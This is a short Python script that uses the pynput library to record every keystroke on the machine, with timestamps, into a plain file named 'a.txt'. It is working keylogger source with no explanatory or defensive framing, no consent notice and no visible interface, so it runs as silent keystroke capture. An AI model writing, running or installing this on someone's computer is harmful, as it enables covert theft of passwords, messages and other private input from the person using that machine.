from pynput.keyboard import Listener
import logging
from time import asctime

# Set up logging
logging.basicConfig(filename='a.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        logging.info(f'Special Key {key} pressed')

# Start listening
with Listener(on_press=on_press) as listener:
    listener.join()